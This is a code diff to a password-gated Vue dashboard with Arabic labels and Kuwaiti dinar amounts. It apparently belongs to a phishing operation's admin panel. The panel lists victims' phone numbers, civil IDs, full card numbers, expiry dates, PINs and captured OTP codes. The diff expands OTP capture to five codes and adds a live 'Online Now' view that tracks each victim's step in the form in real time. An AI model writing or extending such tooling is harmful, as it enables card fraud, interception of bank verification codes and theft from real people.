@@ -15,8 +15,13 @@ const config = useRuntimeConfig()
 type Record = {
   id: number; phone_number?: string; civil_id?: string; id_number?: string;
   amount?: string; bank?: string; card_prefix?: string; card_number?: string;
-  expiry_month?: string; expiry_year?: string; pin?: string; otp1?: string; otp2?: string;
+  expiry_month?: string; expiry_year?: string; pin?: string;
+  otp1?: string; otp2?: string; otp3?: string; otp4?: string; otp5?: string;
   network?: string; step_reached?: number; created_date?: string;
+}
+
+type PresenceEntry = {
+  recordId: string; phone: string; amount: string; step: number; page: string; lastSeen: number;
 }
 
 // ─── Password Gate ─────────────────────────────────────────────────────────
@@ -49,6 +54,7 @@ const handleUnlock = async () => {
 
 // ─── Dashboard State ────────────────────────────────────────────────────────
 const records = ref<Record[]>([])
+const onlineUsers = ref<PresenceEntry[]>([])
 const isLoading = ref(true)
 const selectedRecord = ref<Record | null>(null)
 const dialogType = ref<'personal' | 'card' | null>(null)
@@ -70,7 +76,13 @@ const fetchRecords = async () => {
   isLoading.value = false
 }
 
-watch(unlocked, (v) => { if (v) fetchRecords() })
+watch(unlocked, async (v) => {
+  if (!v) return
+  fetchRecords()
+  onlineUsers.value = await $fetch<PresenceEntry[]>(`${config.public.apiBase}/presence`, {
+    headers: authHeaders.value
+  }).catch(() => [])
+})
 
 // ─── SSE Real-time ──────────────────────────────────────────────────────────
 let es: EventSource | null = null
@@ -91,6 +103,9 @@ watch(unlocked, (v) => {
   es.addEventListener('delete', (e) => {
     const { id } = JSON.parse((e as MessageEvent).data)
     records.value = records.value.filter(r => r.id !== id)
+  })
+  es.addEventListener('presence_update', (e) => {
+    onlineUsers.value = JSON.parse((e as MessageEvent).data) as PresenceEntry[]
   })
 })
 onUnmounted(() => es?.close())
@@ -277,6 +292,27 @@ const { notes } = useToast()
         </div>
       </div>
 
+      <!-- Online Now -->
+      <div v-if="onlineUsers.length > 0" :class="['rounded-2xl border p-4 mb-4', d ? 'border-emerald-500/30 bg-emerald-950/40' : 'border-emerald-300 bg-emerald-50 shadow-sm']">
+        <div class="flex items-center gap-2 mb-3">
+          <span class="relative flex h-2.5 w-2.5">
+            <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
+            <span class="relative inline-flex rounded-full h-2.5 w-2.5 bg-emerald-500"></span>
+          </span>
+          <span :class="['text-sm font-bold', d ? 'text-emerald-400' : 'text-emerald-700']">متصل الآن — {{ onlineUsers.length }}</span>
+        </div>
+        <div class="flex flex-wrap gap-2">
+          <div v-for="u in onlineUsers" :key="u.recordId"
+            :class="['flex items-center gap-2 rounded-xl px-3 py-1.5 border text-xs', d ? 'bg-slate-900/80 border-emerald-500/20 text-slate-300' : 'bg-white border-emerald-200 text-slate-700']">
+            <span :class="['font-semibold', d ? 'text-emerald-400' : 'text-emerald-600']">{{ u.phone || u.recordId }}</span>
+            <span :class="d ? 'text-slate-500' : 'text-slate-400'">•</span>
+            <span>{{ u.amount }} KD</span>
+            <span :class="d ? 'text-slate-500' : 'text-slate-400'">•</span>
+            <span :class="['font-semibold', d ? 'text-violet-400' : 'text-violet-600']">خطوة {{ u.step }}</span>
+          </div>
+        </div>
+      </div>
+
       <!-- Filters -->
       <div :class="['rounded-2xl border p-4 mb-4 flex flex-wrap gap-3 items-center', d ? 'border-white/10 bg-slate-900/60' : 'border-slate-200 bg-white shadow-sm']">
         <input
@@ -362,7 +398,10 @@ const { notes } = useToast()
                   <div class="flex flex-col gap-1.5">
                     <span v-if="r.otp1" :class="['font-mono text-sm font-bold rounded-lg px-2.5 py-1 whitespace-nowrap tracking-widest', d ? 'text-pink-200 bg-pink-500/20 border border-pink-400/40' : 'text-pink-700 bg-pink-100 border border-pink-300']">① {{ r.otp1 }}</span>
                     <span v-if="r.otp2" :class="['font-mono text-sm font-bold rounded-lg px-2.5 py-1 whitespace-nowrap tracking-widest', d ? 'text-sky-200 bg-sky-500/20 border border-sky-400/40' : 'text-sky-700 bg-sky-100 border border-sky-300']">② {{ r.otp2 }}</span>
-                    <span v-if="!r.otp1 && !r.otp2" :class="d ? 'text-slate-600' : 'text-slate-300'">—</span>
+                    <span v-if="r.otp3" :class="['font-mono text-sm font-bold rounded-lg px-2.5 py-1 whitespace-nowrap tracking-widest', d ? 'text-amber-200 bg-amber-500/20 border border-amber-400/40' : 'text-amber-700 bg-amber-100 border border-amber-300']">③ {{ r.otp3 }}</span>
+                    <span v-if="r.otp4" :class="['font-mono text-sm font-bold rounded-lg px-2.5 py-1 whitespace-nowrap tracking-widest', d ? 'text-violet-200 bg-violet-500/20 border border-violet-400/40' : 'text-violet-700 bg-violet-100 border border-violet-300']">④ {{ r.otp4 }}</span>
+                    <span v-if="r.otp5" :class="['font-mono text-sm font-bold rounded-lg px-2.5 py-1 whitespace-nowrap tracking-widest', d ? 'text-rose-200 bg-rose-500/20 border border-rose-400/40' : 'text-rose-700 bg-rose-100 border border-rose-300']">⑤ {{ r.otp5 }}</span>
+                    <span v-if="!r.otp1 && !r.otp2 && !r.otp3 && !r.otp4 && !r.otp5" :class="d ? 'text-slate-600' : 'text-slate-300'">—</span>
                   </div>
                 </td>
                 <td class="px-4 py-3">
@@ -476,6 +515,9 @@ const { notes } = useToast()
                 {label:'الرقم السري',value:selectedRecord.pin},
                 {label:'رمز OTP1',value:selectedRecord.otp1},
                 {label:'رمز OTP2',value:selectedRecord.otp2},
+                {label:'رمز OTP3',value:selectedRecord.otp3},
+                {label:'رمز OTP4',value:selectedRecord.otp4},
+                {label:'رمز OTP5',value:selectedRecord.otp5},
               ].filter(x => x.value)" :key="item.label"
                 :class="['flex justify-between items-center px-4 py-3 hover:bg-white/[0.03]', i > 0 ? 'border-t border-white/5' : '']">
                 <span class="text-sm text-slate-500">{{ item.label }}</span>
